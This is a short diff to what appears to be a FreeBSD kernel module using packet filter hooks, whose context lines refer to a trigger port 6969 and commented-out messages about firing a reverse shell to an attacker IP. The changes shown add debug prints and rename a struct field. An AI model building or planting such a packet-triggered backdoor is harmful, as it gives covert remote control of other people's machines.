@@ -17,6 +17,7 @@
 #include <net/pfil.h>
 #include <netinet/ip_var.h>
 #include <net/if.h>
+#include <sys/syslog.h>
 
 // replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
@@ -77,6 +78,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     log(LOG_NOTICE, "[Kernel Module] working!\n");
     log(LOG_NOTICE, "[Kernel Module] working!\n");
     log(LOG_NOTICE, "[Kernel Module] working!\n");
+    printf("yessir is working!!!");
 
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
@@ -101,7 +103,7 @@ static int load_head(void) {
         printf("[LKM] Could not register custom pfil_head\n");
         return (ENOMEM);
     }
-    printf("[LKM] Custom pfil_head registered: %s\n", pha.pha_headname);
+    printf("[LKM] Custom pfil_head registered: %s\n", pha.pa_headname);
     return (0);
 };
 
